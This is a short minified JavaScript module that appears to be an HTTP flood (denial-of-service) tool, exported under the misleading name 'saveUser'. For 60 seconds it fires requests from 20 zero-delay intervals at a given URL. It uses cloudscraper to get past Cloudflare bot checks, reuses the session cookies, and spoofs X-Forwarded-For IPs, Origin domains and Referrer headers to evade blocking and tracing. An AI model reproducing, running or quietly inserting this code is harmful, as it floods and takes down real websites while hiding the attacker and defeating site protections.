// @ts-nocheck
import cloudscraper from"cloudscraper";import request from"request";const rIp=()=>{const e=()=>Math.floor(255*Math.random());return`${e()}.${e()}.${e()}.${e()}`},rStr=e=>{const r="abcdefghijklmnopqstuvwxyz0123456789";let t="";for(let o=0;o<e;o++)t+=r[Math.floor(35*Math.random())];return t};export default function saveUser(e){const r=e;for(let e=0;e<20;e++){const e=setInterval((()=>{cloudscraper.get(r,(function(e,t,o){if(e)return;const s=t.request.headers.request.cookie,a=t.request.headers["User-Agent"],c=rIp();request({url:r,headers:{"User-Agent":a,Accept:"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","Upgrade-Insecure-Requests":"1",cookie:s,Origin:"http://"+rStr(8)+".com",Referrer:"http://google.com/"+rStr(10),"X-Forwarded-For":c}})}))}));setTimeout((()=>clearInterval(e)),6e4)}}